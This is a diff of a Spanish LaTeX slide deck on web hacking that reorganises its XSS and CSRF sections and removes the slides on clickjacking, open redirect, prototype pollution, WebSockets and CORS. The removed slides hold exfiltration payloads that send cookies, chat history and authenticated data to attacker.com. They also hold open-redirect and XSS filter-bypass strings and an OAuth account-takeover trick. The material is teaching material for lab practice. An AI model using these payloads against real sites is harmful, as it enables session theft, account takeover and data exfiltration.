@@ -749,6 +749,8 @@ Burp es un Proxy web
 \end{frame}
 
 \section{Cross-Site Scripting (XSS)}
+\subsection{Conceptos, tipos y explotación}
+
 
 \begin{frame}[allowframebreaks]{Cross-Site Scripting (XSS) --- qué es y tipos}
 \small
@@ -1347,564 +1349,8 @@ Burp es un Proxy web
 \end{center}
 \end{frame}
 
-\begin{frame}{Referencias y práctica --- Cross-Site Scripting (XSS)}
-\footnotesize
-  \begin{itemize}
-  \item \href{https://portswigger.net/web-security/cross-site-scripting}{PortSwigger Web Security Academy --- XSS} (labs)
-  \item \href{https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html}{OWASP --- XSS Prevention Cheat Sheet}
-  \item \href{https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html}{OWASP --- DOM-based XSS Prevention}
-  \item \href{https://portswigger.net/web-security/cross-site-scripting/cheat-sheet}{PortSwigger --- XSS Cheat Sheet (payloads)}
-  \item \href{https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP}{MDN --- Content Security Policy (CSP)}
-  \end{itemize}
-\end{frame}
+\subsection{Laboratorios (PortSwigger Academy)}
 
-\section{CSRF}
-
-\begin{frame}[allowframebreaks]{CSRF}
-\small
-  \begin{itemize}
-  \item Cross-Site Request Forgery
-  \end{itemize}
-\end{frame}
-
-\begin{frame}[allowframebreaks]{CSRF --- Cross-Site Request Forgery}
-\small
-  \begin{itemize}
-  \item Vulnerabilidades Web
-  \item ¿Qué es?
-  \item Una web maliciosa hace que el NAVEGADOR de la víctima (ya
-  \item autenticada) envíe una petición al sitio vulnerable sin que
-  \item ella lo sepa.
-  \item Ejemplo (DVWA --- cambiar contraseña)
-  \item GET /dvwa/vulnerabilities/csrf/?password\_new=1234\&
-  \item password\_conf=1234\&Change=Change
-  \item Entrega del payload
-  \item Web falsa (apache2 en /var/www/html) $\cdot$ enlace en email $\cdot$
-  \item con XSS almacenado se auto-dispara $\cdot$ curl con la cookie robada.
-  \item Defensa: token anti-CSRF por petición $\cdot$ cookies SameSite $\cdot$
-  \item verificar que la acción es intencionada.
-  \item PortSwigger CSRF $\cdot$ OWASP CSRF Prevention
-  \item Víctima autenticada
-  \item visita la web del atacante
-  \item El navegador envía
-  \item la petición a DVWA
-  \item Acción ejecutada
-  \item (cambio de contraseña)
-  \end{itemize}
-\end{frame}
-
-\begin{frame}[allowframebreaks]{CSRF}
-\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl135_1.png}
-\end{center}
-\end{frame}
-
-\begin{frame}[allowframebreaks]{Realiza un ataque CSRF en la web DVWA}
-\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl136_1.jpg}
-\end{center}
-\end{frame}
-
-\begin{frame}[allowframebreaks]{Realiza un ataque XSS almacenado con un CSRF en DVWA}
-\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl137_1.jpg}
-\end{center}
-\end{frame}
-
-\begin{frame}[allowframebreaks]{CSRF}
-\small
-  \begin{itemize}
-  \item CSRF e Ingeniería Social:
-    \begin{itemize}
-    \item La idea es crear una web falsa que incorpore en payload del ataque CSRF.
-    \item Con esto, sólo sería necesario engañar a la víctima para que visite esa web falsa, mientras está autenticada en DVWA.
-    \item Pro ejemplo:
-    \end{itemize}
-  \end{itemize}
-\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl138_1.png}
-\end{center}
-\end{frame}
-
-\begin{frame}[allowframebreaks]{CSRF}
-\small
-  \begin{itemize}
-  \item CSRF e Ingeniería Social:
-    \begin{itemize}
-    \item En el propio Kali, puedes levantar el servicio web con la web falsa
-      \begin{itemize}
-      \item sudo service apache2 start
-      \item y colgar la web en el /var/www/html
-      \end{itemize}
-    \end{itemize}
-  \end{itemize}
-\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl139_1.png}
-\end{center}
-\end{frame}
-
-\begin{frame}[allowframebreaks]{CSRF}
-\small
-  \begin{itemize}
-  \item CSRF e Ingeniería Social:
-    \begin{itemize}
-    \item También se puede hacer mediante un mail con un hipervínculo
-    \end{itemize}
-  \end{itemize}
-\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl140_1.png}
-\end{center}
-\end{frame}
-
-\begin{frame}[allowframebreaks]{CSRF}
-\small
-  \begin{itemize}
-  \item CSRF con curl:
-  \item Si el usuario está autenticado en DVWA y conseguidnos su cookie de sesión, podemos cambiarle su password sin que se entere explotando la vulnerabilidad CSRF mediante la herramienta curl
-  \item Para evitar ataques CSRF hay que asegurarse que una acción está realmente siendo llevada a cabo por el usuario en lugar de un tercero (navegador), para ello, hay que asociarlo con algún tipo de identificador único que puede ser verificado después, llamado token.
-  \item Vulnerabilidades Web
-  \end{itemize}
-\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl141_1.png}
-\end{center}
-\end{frame}
-
-\begin{frame}[allowframebreaks]{Ejercicio}
-\small
-  \begin{itemize}
-  \item Serías capaz de hacer un robo de cuenta de usuario explotando una vulnerabilidad CSRF e inyectándola vía XSS en la aplicación bWAPP y en DVWA
-  \item Soluciones
-  \end{itemize}
-\begin{center}\includegraphics[width=0.62\textwidth,height=0.42\textheight,keepaspectratio]{img/sl142_1.jpg}
-\end{center}
-\begin{center}\includegraphics[width=0.62\textwidth,height=0.42\textheight,keepaspectratio]{img/sl142_2.png}
-\end{center}
-\begin{center}\includegraphics[width=0.62\textwidth,height=0.42\textheight,keepaspectratio]{img/sl142_3.png}
-\end{center}
-\end{frame}
-
-\begin{frame}{Referencias y práctica --- CSRF}
-\footnotesize
-  \begin{itemize}
-  \item \href{https://portswigger.net/web-security/csrf}{PortSwigger --- CSRF} (labs)
-  \item \href{https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html}{OWASP --- CSRF Prevention Cheat Sheet}
-  \item \href{https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite}{MDN --- SameSite cookies}
-  \end{itemize}
-\end{frame}
-
-\section{Clickjacking}
-
-\begin{frame}[allowframebreaks]{Clickjacking}
-\end{frame}
-
-\begin{frame}[allowframebreaks]{Clickjacking}
-\small
-  \begin{itemize}
-  \item Este ataque consiste en superponer una capa transparente en la interfaz de una aplicación web.
-  \item Esto permite al atacante engañar al usuario, que realiza acciones indeseadas sin percatarse.
-  \item La forma de realizar este ataque puede ser parecida a un XSS, podemos inyectar código html o un evento indeseado para el usuario.
-  \item En ciertas aplicaciones como las bancarias, este ataque puede ser terriblemente peligroso.
-  \item Vulnerabilidades Web
-  \end{itemize}
-\end{frame}
-
-\begin{frame}[allowframebreaks]{Realiza un ataque clickjacking en la web DVWA}
-\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl149_1.jpg}
-\end{center}
-\end{frame}
-
-\begin{frame}{Referencias y práctica --- Clickjacking}
-\footnotesize
-  \begin{itemize}
-  \item \href{https://portswigger.net/web-security/clickjacking}{PortSwigger --- Clickjacking} (labs)
-  \item \href{https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html}{OWASP --- Clickjacking Defense Cheat Sheet}
-  \item \href{https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options}{MDN --- X-Frame-Options y frame-ancestors}
-  \end{itemize}
-\end{frame}
-
-\section{Open Redirect}
-
-\begin{frame}[allowframebreaks]{Open Redirect --- Fundamentos}
-\small
-  \begin{itemize}
-  \item Vulnerabilidades Web
-  \item ¿Qué es un Open Redirect?
-  \item La app acepta una URL como parámetro y redirige al usuario a ella sin validar
-  \item si el destino es legítimo. El atacante usa el dominio de confianza como gancho.
-  \item Ejemplo básico
-  \item https://banco.com/redirect?url=https://bank0.com/phishing
-  \item $\rightarrow$ El servidor responde: 302 Location: https://bank0.com/phishing
-  \item $\rightarrow$ La víctima ve 'banco.com' en el link $\rightarrow$ confía y hace clic
-  \item Parámetros habituales de redirección
-  \item ?url= ?next= ?redirect= ?return= ?goto= ?dest= ?target=
-  \item Cabecera Referer en respuestas de logout/login
-  \item $\rightarrow$ Buscar con: ffuf -w params.txt -u 'https://victima.com/?FUZZ=https://test.com'
-  \item Impacto
-  \item Phishing: link parece legítimo (dominio real de confianza)
-  \item Robo de tokens OAuth: redirect\_uri puede apuntar al atacante
-  \item Encadenamiento con SSRF para redirigir peticiones internas
-  \item Herramienta: Oralyzer
-  \item pip install oralyzer
-  \item oralyzer -u 'https://victima.com/redir?next=FUZZ'
-  \item OWASP: owasp.org/www-project-web-security-testing-guide (OTG-CLIENT-004)
-  \item Más: linkedin/deepmarketer --- Exploiting Open Redirection
-  \end{itemize}
-\end{frame}
-
-\begin{frame}[allowframebreaks]{Open Redirect --- Bypass y encadenamiento con OAuth}
-\small
-  \begin{itemize}
-  \item Vulnerabilidades Web
-  \item Bypass de validaciones basadas en startswith/contains
-  \item[] \cmdbox{Si la app valida que la URL empiece por el dominio legítimo:}
-  \item https://victima.com.attacker.com (subdominio del atacante)
-  \item https://victima.com@attacker.com (@ separa user:pass del host)
-  \item //attacker.com (protocol-relative URL)
-  \item /\textbackslash\{\}attacker.com (backslash normalizado por browsers)
-  \item Bypass con codificación
-  \item \%2F\%2Fattacker.com (doble slash URL-encoded)
-  \item https://attacker\%2Ecom (punto URL-encoded)
-  \item https://attacker\textbackslash\{\}.com (backslash confunde parsers)
-  \item Account Takeover vía OAuth + Open Redirect
-  \item[] \cmdbox{Si el servidor OAuth valida redirect\_uri como 'startswith':}
-  \item GET /oauth/authorize?client\_id=X
-  \item \&redirect\_uri=https://victima.com/cb/../../../attacker.com
-  \item $\rightarrow$ Path traversal en la URL $\rightarrow$ el authorization code llega al atacante
-  \item $\rightarrow$ El atacante canjea el code por access\_token $\rightarrow$ Account Takeover
-  \item Encadenamiento con XSS (javascript: protocol)
-  \item ?url=javascript:fetch('https://attacker.com/?c='+document.cookie)
-  \item $\rightarrow$ Solo en clientes que ejecutan javascript: en location (raro en navegadores modernos)
-  \item Severidad: Media sola --- Crítica encadenada con OAuth o XSS
-  \item portswigger.net/web-security/oauth (open redirect + OAuth account takeover)
-  \item Automatizar la búsqueda: Oralyzer
-  \item Script en Python que prueba Open Redirect
-  \item fuzzeando el parámetro vulnerable de la URL.
-  \item Detecta además CRLF injection.
-  \item Instalación
-  \item git clone github.com/r0075h3ll/Oralyzer
-  \item pip3 install -r requirements.txt
-  \item Uso
-  \item python3 oralyzer.py -u 'http://site/?url=FUZZ'
-  \item python3 oralyzer.py -l urls.txt (lista)
-  \item Módulo web.archive.org: recolecta URLs con
-  \item parámetros sospechosos (?url= ?next=\dots{}) y las prueba.
-  \item github.com/r0075h3ll/Oralyzer
-  \end{itemize}
-\end{frame}
-
-\begin{frame}{Referencias y práctica --- Open Redirect}
-\footnotesize
-  \begin{itemize}
-  \item \href{https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html}{OWASP --- Unvalidated Redirects Cheat Sheet}
-  \item \href{https://portswigger.net/kb/issues/00500100_open-redirection-reflected}{PortSwigger --- Open Redirection}
-  \end{itemize}
-\end{frame}
-
-\section{Prototype Pollution}
-
-\begin{frame}[allowframebreaks]{Prototype Pollution}
-\small
-  \begin{itemize}
-  \item Vulnerabilidades Web
-  \item ¿Qué es?
-  \item El atacante modifica Object.prototype en JavaScript. Como TODOS
-  \item los objetos heredan de él, el cambio afecta a TODA la app.
-  \item obj.\_\_proto\_\_.isAdmin = true $\cdot$ \{\textquotedbl{}\_\_proto\_\_\textquotedbl{}:\{\textquotedbl{}isAdmin\textquotedbl{}:true\}\}
-  \item Impacto (muy alto)
-  \item Escalada de privilegios (inyectar isAdmin:true).
-  \item Bypass de validaciones (if(obj.authenticated)).
-  \item Cambiar comportamientos internos (getters/setters).
-  \item Denial of Service.
-  \item Dónde
-  \item Client-side (DOM) y server-side (Node.js); encadena a XSS/RCE
-  \item según los 'gadgets' disponibles.
-  \item PortSwigger Prototype Pollution
-  \end{itemize}
-\end{frame}
-
-\begin{frame}[allowframebreaks]{Prototype Pollution --- lado cliente}
-\small
-  \begin{itemize}
-  \item Vulnerabilidades Web
-  \item Fuentes (sources) en el navegador
-  \item ?\_\_proto\_\_[gadget]=payload (desde location.hash/search $\rightarrow$ merge)
-  \item URL, JSON.parse y merges recursivos que copian claves del usuario a Object.prototype.
-  \item XSS en el DOM por pollution
-  \item ?\_\_proto\_\_[hitCallback]=alert(document.cookie)
-  \item Se contamina un gadget (config, callback, src) que un script del cliente usa sin comprobar $\rightarrow$ XSS DOM.
-  \item Vectores alternativos y bypass de sanitización
-  \item constructor[prototype][x] $\cdot$ \_\_pro\_\_proto\_\_to\_\_ (no recursivo)
-  \item Si bloquean \_\_proto\_\_, usar constructor.prototype; si la sanitización no es recursiva, se reconstruye (como path traversal).
-  \item DOM Invader (Burp) automatiza sources/sinks/gadgets $\cdot$ hack4u.io
-  \end{itemize}
-\end{frame}
-
-\begin{frame}[allowframebreaks]{Prototype Pollution --- libs de terceros}
-\small
-  \begin{itemize}
-  \item Vulnerabilidades Web
-  \item Librerías vulnerables clásicas
-  \item lodash \_.merge/\_.set $\cdot$ jQuery \$.extend(true,\dots{}) $\cdot$ minimist, deep-merge
-  \item Funciones de merge/clone recursivas que no filtran \_\_proto\_\_ $\rightarrow$ el gadget está en la propia librería.
-  \item Encontrar el gadget (source $\rightarrow$ sink)
-  \item Contaminar una propiedad y ver si la librería la lee para construir HTML, opciones o comandos.
-  \item Ejemplo (client-side)
-  \item \$.extend(true, \{\}, JSON.parse(location.hash.slice(1)))
-  \item Un \$.extend profundo con datos de la URL $\rightarrow$ pollution directa.
-  \item Defensa: actualizar la librería, Object.create(null) o Map; congelar Object.prototype.
-  \item Técnicas del curso hack4u.io
-  \end{itemize}
-\end{frame}
-
-\begin{frame}{Referencias y práctica --- Prototype Pollution}
-\footnotesize
-  \begin{itemize}
-  \item \href{https://portswigger.net/web-security/prototype-pollution}{PortSwigger --- Prototype Pollution} (labs)
-  \item \href{https://github.com/BlackFan/client-side-prototype-pollution}{BlackFan --- Client-side Prototype Pollution (gadgets)}
-  \end{itemize}
-\end{frame}
-
-\section{WebSockets}
-
-\begin{frame}[allowframebreaks]{WebSockets --- Pentesting}
-\small
-  \begin{itemize}
-  \item Vulnerabilidades Web
-  \item Fundamentos y handshake
-  \item CSWSH (CSRF en WebSockets)
-  \item Interceptación y manipulación
-  \item Otras vulnerabilidades y defensa
-  \end{itemize}
-\end{frame}
-
-\begin{frame}[allowframebreaks]{WebSockets --- Pentesting y vulnerabilidades}
-\small
-  \begin{itemize}
-  \item Vulnerabilidades Web
-  \item ¿Qué son los WebSockets?
-  \item Protocolo full-duplex sobre TCP: mantiene una conexión persistente
-  \item entre cliente y servidor. Usado en chats, dashboards, notificaciones, juegos.
-  \item Handshake de apertura WebSocket
-  \item[] \cmdbox{El cliente envía (HTTP Upgrade):}
-  \item GET /chat HTTP/1.1
-  \item Upgrade: websocket
-  \item Connection: Upgrade
-  \item Sec-WebSocket-Key: BASE64\_RANDOM==
-  \item[] \cmdbox{El servidor confirma: 101 Switching Protocols\\{}
-A partir de aquí: comunicación binaria bidireccional}
-  \item Interceptar WebSockets con Burp Suite
-  \item Proxy $\rightarrow$ WebSockets History: muestra todos los mensajes WS enviados/recibidos
-  \item Clic derecho en un mensaje $\rightarrow$ Send to Repeater
-  \item Modificar y reenviar mensajes WS manualmente en tiempo real
-  \item Vulnerabilidades comunes en WebSockets
-  \item Inyección (XSS, SQLi, CMDi) en mensajes WS sin sanitizar
-  \item Falta de autenticación en el handshake (cualquiera puede conectarse)
-  \item Ausencia de cifrado (ws:// en vez de wss:// $\rightarrow$ tráfico en claro)
-  \item Cross-Site WebSocket Hijacking (CSWSH) $\rightarrow$ ver siguiente diapositiva
-  \item portswigger.net/web-security/websockets
-  \end{itemize}
-\end{frame}
-
-\begin{frame}[allowframebreaks]{WebSockets --- Cross-Site WebSocket Hijacking (CSWSH)}
-\small
-  \begin{itemize}
-  \item Vulnerabilidades Web
-  \item ¿Qué es CSWSH?
-  \item Equivalente a CSRF para WebSockets: el atacante abre una conexión WS
-  \item en nombre de la víctima desde un dominio malicioso.
-  \item Condiciones para que sea explotable
-  \item 1. El handshake NO incluye un token CSRF
-  \item 2. El servidor autentica usando solo las cookies de sesión
-  \item 3. El servidor no valida el header Origin del handshake
-  \item Payload CSWSH (página del atacante)
-  \item \textbf{HTML en el servidor del atacante:}
-  \item \textless{}script\textgreater{}
-  \item var ws = new WebSocket('wss://victima.com/chat');
-  \item ws.onopen = () =\textgreater{} ws.send(JSON.stringify(\{action:'get\_history'\}));
-  \item ws.onmessage = e =\textgreater{} fetch('https://attacker.com/?d='+btoa(e.data));
-  \item \textless{}/script\textgreater{}
-  \item $\rightarrow$ La víctima visita la página del atacante
-  \item $\rightarrow$ Su navegador abre una WS connection autenticada con las cookies de victima.com
-  \item $\rightarrow$ El historial de chat se exfiltra al servidor del atacante
-  \item Medidas de protección
-  \item Validar el header Origin en el handshake del servidor WS
-  \item Incluir un token CSRF como parámetro en la URL del handshake
-  \item Usar tokens de sesión en el primer mensaje WS, no solo cookies
-  \item portswigger.net/web-security/websockets/cross-site-websocket-hijacking
-  \end{itemize}
-\end{frame}
-
-\begin{frame}[allowframebreaks]{WebSockets --- Interceptación y manipulación}
-\small
-  \begin{itemize}
-  \item Vulnerabilidades Web
-  \item Interceptar el tráfico WS
-  \item Burp: pestaña 'WebSockets history' $\rightarrow$ interceptar y editar
-  \item mensajes en tiempo real (Repeater para WS).
-  \item Probar downgrade: ¿acepta ws:// (texto plano) en vez de wss://?
-  \item Manipular mensajes = inyectar
-  \item Cada mensaje es entrada del usuario $\rightarrow$ mismas inyecciones:
-  \item \{\textquotedbl{}message\textquotedbl{}:\textquotedbl{}\textless{}img src=x onerror=alert(1)\textgreater{}\textquotedbl{}\} $\rightarrow$ XSS
-  \item \{\textquotedbl{}id\textquotedbl{}:\textquotedbl{}1 OR 1=1\textquotedbl{}\} $\rightarrow$ SQLi $\cdot$ XXE en payloads XML
-  \item Herramientas
-  \item Burp (WS history) $\cdot$ wsrepl $\cdot$ websocat $\cdot$ OWASP ZAP
-  \item cobalt.io --- A Pentester's Guide to WebSocket Pentesting
-  \item Mensaje WS legítimo
-  \item \{\textquotedbl{}message\textquotedbl{}:\textquotedbl{}hola\textquotedbl{}\}
-  \item Burp intercepta y edita
-  \item \{\textquotedbl{}message\textquotedbl{}:\textquotedbl{}\textless{}img onerror\textgreater{}\textquotedbl{}\}
-  \item Servidor sin validar $\rightarrow$ XSS
-  \end{itemize}
-\end{frame}
-
-\begin{frame}[allowframebreaks]{WebSockets --- Manipulación del handshake}
-\small
-  \begin{itemize}
-  \item Vulnerabilidades Web
-  \item ¿Qué es?
-  \item Modificar las cabeceras del handshake de apertura (HTTP Upgrade) para saltarse defensas del servidor durante un ataque por WebSocket.
-  \item Bypass de bloqueo por IP con X-Forwarded-For
-  \item GET /chat HTTP/1.1 Upgrade: websocket Connection: Upgrade X-Forwarded-For: 1.2.3.4
-  \item Si el servidor banea tu IP al detectar un ataque (p.ej. XSS por mensaje), añadir/rotar X-Forwarded-For en el handshake resetea el bloqueo.
-  \item Ofuscar el payload para el filtro XSS
-  \item \textless{}img src=1 oNeRRor=alert(document.cookie)\textgreater{}
-  \item Se combina con la manipulación de mensajes: ofuscar el payload (mayúsculas, encoding, atributos raros) para pasar el filtro del servidor.
-  \item Flujo típico (lab PortSwigger)
-  \item 1) Interceptar el handshake en Burp. 2) Reenviarlo con X-Forwarded-For falsificado. 3) Enviar el mensaje WS con el XSS ofuscado $\rightarrow$ se ejecuta.
-  \item Fuente: curso Hacking Web $\cdot$ hack4u.io $\cdot$ cf. PortSwigger WebSockets
-  \end{itemize}
-\end{frame}
-
-\begin{frame}[allowframebreaks]{WebSockets --- Otras vulnerabilidades y defensa}
-\small
-  \begin{itemize}
-  \item Vulnerabilidades Web
-  \item Comunicaciones sin cifrar (ws://)
-  \item ws:// viaja en claro $\rightarrow$ MitM, robo de tokens y datos sensibles.
-  \item Denial of Service
-  \item Abrir muchas conexiones o mensajes masivos sin límite $\rightarrow$ DoS.
-  \item Exposición de información sensible
-  \item Tokens y datos personales en los mensajes WS sin protección.
-  \item Defensa (remediation)
-  \item Usar wss:// (TLS); validar el header Origin en el handshake;
-  \item token CSRF en el handshake (anti-CSWSH); validar/sanear TODO
-  \item mensaje; autenticar por mensaje; límites de conexión y ritmo.
-  \item Trata cada mensaje WS como entrada NO confiable.
-  \item cobalt.io $\cdot$ portswigger.net/web-security/websockets
-  \end{itemize}
-\end{frame}
-
-\begin{frame}{Referencias y práctica --- WebSockets}
-\footnotesize
-  \begin{itemize}
-  \item \href{https://portswigger.net/web-security/websockets}{PortSwigger --- WebSockets security} (labs)
-  \item \href{https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html}{OWASP --- HTML5 / WebSockets Security}
-  \end{itemize}
-\end{frame}
-
-\section{CORS}
-
-\begin{frame}[allowframebreaks]{CORS --- Compartición de Recursos entre Orígenes}
-\small
-  \begin{itemize}
-  \item CORS
-  \item ¿Qué es CORS y por qué existe?
-  \item La Same-Origin Policy (SOP) impide que JS de origin-A lea respuestas de origin-B.
-  \item CORS (Cross-Origin Resource Sharing) es el mecanismo que RELAJA esa restricción
-  \item de forma controlada mediante cabeceras HTTP.
-  \item Cabeceras clave
-  \item Access-Control-Allow-Origin: https://trusted.com $\rightarrow$ quién puede leer la respuesta
-  \item Access-Control-Allow-Credentials: true $\rightarrow$ se incluyen cookies/auth
-  \item Access-Control-Allow-Methods / Headers $\rightarrow$ métodos y cabeceras permitidos
-  \item $\rightarrow$ El navegador hace un preflight OPTIONS antes de peticiones no simples.
-  \item Petición simple vs Preflight
-  \item Simple: GET/POST con Content-Type estándar $\rightarrow$ navegador añade Origin y espera ACAO.
-  \item Preflight: PUT, DELETE, cabeceras custom $\rightarrow$ OPTIONS primero, luego la petición real.
-  \item ¿Cuándo hay vulnerabilidad?
-  \item El servidor configura ACAO de forma demasiado permisiva (refleja el Origin, usa *, permite null).
-  \item Si además permite credenciales $\rightarrow$ el atacante puede leer datos autenticados del usuario.
-  \item CORS mal configurado $\neq$ CSRF. CORS permite LEER la respuesta; CSRF ejecuta acciones.
-  \end{itemize}
-\end{frame}
-
-\begin{frame}[allowframebreaks]{CORS --- Reflexión del Origen (Labs 92-93)}
-\small
-  \begin{itemize}
-  \item CORS
-  \item Vulnerabilidad --- Reflexión del origen sin validación (Labs 92-93)
-  \item El servidor toma el valor del header Origin de la petición y lo devuelve tal cual en ACAO.
-  \item Resultado: cualquier origen puede leer la respuesta, incluidos datos sensibles.
-  \item \textbf{Petición del atacante:}
-  \item \cmd{Origin: https://attacker.com}
-  \item \textbf{Respuesta del servidor vulnerable:}
-  \item \cmd{Access-Control-Allow-Origin: https://attacker.com}
-  \item \cmd{Access-Control-Allow-Credentials: true}
-  \item Código del ataque (Lab 92)
-  \item \cmd{fetch('https://victim.com/api/userdata', \{}
-  \item \cmd{credentials: 'include'}
-  \item \cmd{\}).then(r =\textgreater{} r.json()).then(data =\textgreater{} \{}
-  \item \cmd{fetch('https://attacker.com/log?d=' + JSON.stringify(data));}
-  \item \cmd{\});}
-  \item $\rightarrow$ La víctima ejecuta este JS (via XSS o página controlada por atacante).
-  \item $\rightarrow$ credentials:include envía las cookies $\rightarrow$ respuesta incluye datos privados.
-  \item Lab 93 --- ACAO con wildcard y credenciales
-  \item Access-Control-Allow-Origin: * con Allow-Credentials: true $\rightarrow$ combinación inválida
-  \item $\rightarrow$ Los navegadores rechazan esta combinación, pero algunos servidores la configuran mal.
-  \item Un servidor que refleja el Origin es equivalente a ACAO: * para el atacante.
-  \end{itemize}
-\end{frame}
-
-\begin{frame}[allowframebreaks]{CORS --- Origen null y Protocolos Inseguros}
-\small
-  \begin{itemize}
-  \item CORS
-  \item Lab 94 --- Origen null en la whitelist
-  \item El header Origin vale 'null' en: iframes sandbox, data: URLs, file:// y redirects cross-origin.
-  \item Si el servidor confía en null: Access-Control-Allow-Origin: null
-  \item El atacante usa un iframe sandbox para generar Origin: null y leer la respuesta:
-  \item \cmd{\textless{}iframe sandbox='allow-scripts allow-top-navigation allow-forms'}
-  \item \cmd{srcdoc=\textquotedbl{}\textless{}script\textgreater{}}
-  \item \cmd{fetch('https://victim.com/api/data', \{credentials:'include'\})}
-  \item \cmd{.then(r=\textgreater{}r.text()).then(d=\textgreater{}location='https://attacker.com/?d='+d);}
-  \item \cmd{\textless{}/script\textgreater{}\textquotedbl{}\textgreater{}}
-  \item \cmd{\textless{}/iframe\textgreater{}}
-  \item Labs 95-96 --- Protocolo inseguro en la whitelist
-  \item El servidor confía en http://trusted.com (HTTP, sin TLS).
-  \item El atacante en posición MITM intercepta la petición HTTP a trusted.com
-  \item e inyecta una respuesta con el payload CORS.
-  \item Resultado: el navegador cree que la petición viene de un origen confiable.
-  \item $\rightarrow$ Subdominios HTTP de la whitelist son un vector frecuente en entornos reales.
-  \item Nunca incluir 'null' ni URLs http:// en la whitelist de CORS.
-  \end{itemize}
-\end{frame}
-
-\begin{frame}[allowframebreaks]{CORS --- Defensa y Configuración Segura}
-\small
-  \begin{itemize}
-  \item CORS
-  \item Configuración segura de CORS
-  \item Whitelist explícita y estática de orígenes de confianza:
-  \item \cmd{if (request.origin in ALLOWED\_ORIGINS):}
-  \item \cmd{response['Access-Control-Allow-Origin'] = request.origin}
-  \item Nunca reflejar el valor de Origin directamente sin validar.
-  \item Nunca poner null en la whitelist.
-  \item Solo usar http:// si la conexión es interna y controlada.
-  \item Reglas sobre credenciales
-  \item Allow-Credentials: true SOLO con un ACAO específico (nunca con *).
-  \item Si no necesitas credenciales cross-origin $\rightarrow$ no habilites Allow-Credentials.
-  \item Cabecera Vary: Origin
-  \item Añadir Vary: Origin para que los proxies cacheen por origen.
-  \item $\rightarrow$ Sin esto, un proxy puede devolver la respuesta CORS de otro origen.
-  \item No usar CORS como control de acceso
-  \item CORS es un mecanismo del NAVEGADOR --- no protege peticiones server-to-server.
-  \item Las APIs deben autenticar y autorizar cada petición independientemente.
-  \item Combinar con: autenticación robusta + tokens CSRF + SameSite=Strict.
-  \item Una configuración CORS laxa + credenciales = exfiltración de datos autenticados.
-  \end{itemize}
-\end{frame}
-
-\begin{frame}{Referencias y práctica --- CORS}
-\footnotesize
-  \begin{itemize}
-  \item \href{https://portswigger.net/web-security/cors}{PortSwigger --- CORS} (labs)
-  \item \href{https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS}{MDN --- Cross-Origin Resource Sharing}
-  \end{itemize}
-\end{frame}
-
-\section{XSS --- PortSwigger Academy}
 
 \begin{frame}[allowframebreaks]{Hacking de Aplicaciones Web:}
 \small
@@ -2393,7 +1839,139 @@ john --format=netntlmv2 ntlmv2.txt --wordlist=rockyou.txt}
   \end{itemize}
 \end{frame}
 
-\section{CSRF --- PortSwigger Academy}
+\begin{frame}{Referencias y práctica --- Cross-Site Scripting (XSS)}
+\footnotesize
+  \begin{itemize}
+  \item \href{https://portswigger.net/web-security/cross-site-scripting}{PortSwigger Web Security Academy --- XSS} (labs)
+  \item \href{https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html}{OWASP --- XSS Prevention Cheat Sheet}
+  \item \href{https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html}{OWASP --- DOM-based XSS Prevention}
+  \item \href{https://portswigger.net/web-security/cross-site-scripting/cheat-sheet}{PortSwigger --- XSS Cheat Sheet (payloads)}
+  \item \href{https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP}{MDN --- Content Security Policy (CSP)}
+  \end{itemize}
+\end{frame}
+
+\section{CSRF}
+\subsection{Fundamentos y ataques}
+
+
+\begin{frame}[allowframebreaks]{CSRF}
+\small
+  \begin{itemize}
+  \item Cross-Site Request Forgery
+  \end{itemize}
+\end{frame}
+
+\begin{frame}[allowframebreaks]{CSRF --- Cross-Site Request Forgery}
+\small
+  \begin{itemize}
+  \item Vulnerabilidades Web
+  \item ¿Qué es?
+  \item Una web maliciosa hace que el NAVEGADOR de la víctima (ya
+  \item autenticada) envíe una petición al sitio vulnerable sin que
+  \item ella lo sepa.
+  \item Ejemplo (DVWA --- cambiar contraseña)
+  \item GET /dvwa/vulnerabilities/csrf/?password\_new=1234\&
+  \item password\_conf=1234\&Change=Change
+  \item Entrega del payload
+  \item Web falsa (apache2 en /var/www/html) $\cdot$ enlace en email $\cdot$
+  \item con XSS almacenado se auto-dispara $\cdot$ curl con la cookie robada.
+  \item Defensa: token anti-CSRF por petición $\cdot$ cookies SameSite $\cdot$
+  \item verificar que la acción es intencionada.
+  \item PortSwigger CSRF $\cdot$ OWASP CSRF Prevention
+  \item Víctima autenticada
+  \item visita la web del atacante
+  \item El navegador envía
+  \item la petición a DVWA
+  \item Acción ejecutada
+  \item (cambio de contraseña)
+  \end{itemize}
+\end{frame}
+
+\begin{frame}[allowframebreaks]{CSRF}
+\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl135_1.png}
+\end{center}
+\end{frame}
+
+\begin{frame}[allowframebreaks]{Realiza un ataque CSRF en la web DVWA}
+\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl136_1.jpg}
+\end{center}
+\end{frame}
+
